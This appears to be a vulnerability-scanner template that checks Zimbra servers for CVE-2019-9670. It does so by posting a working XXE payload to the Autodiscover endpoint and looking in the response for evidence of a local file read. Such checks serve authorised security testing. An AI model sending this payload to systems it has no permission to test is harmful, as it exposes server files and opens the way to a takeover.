detail:
  author: fnmsd(https://blog.csdn.net/fnmsd)
  cve-id: CVE-2019-9670
  description: Zimbra XXE Vul,may Control your Server with AdminPort SSRF
  links:
  - https://blog.csdn.net/fnmsd/article/details/88657083
  - https://blog.csdn.net/fnmsd/article/details/89235589
  vuln_path: /Autodiscover/Autodiscover.xml
expression: r0()
manual: true
name: poc-yaml-zimbra-cve-2019-9670-xxe
rules:
  r0:
    expression: response.body.bcontains(b"zmmailboxd.out") && response.body.bcontains(b"Requested
      response schema not available")
    request:
      body: <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:./" >]><Autodiscover
        xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"><Request><EMailAddress>test@test.com</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request></Autodiscover>
      cache: true
      follow_redirects: false
      headers:
        Content-Type: text/xml
      method: POST
      path: /Autodiscover/Autodiscover.xml
transport: http
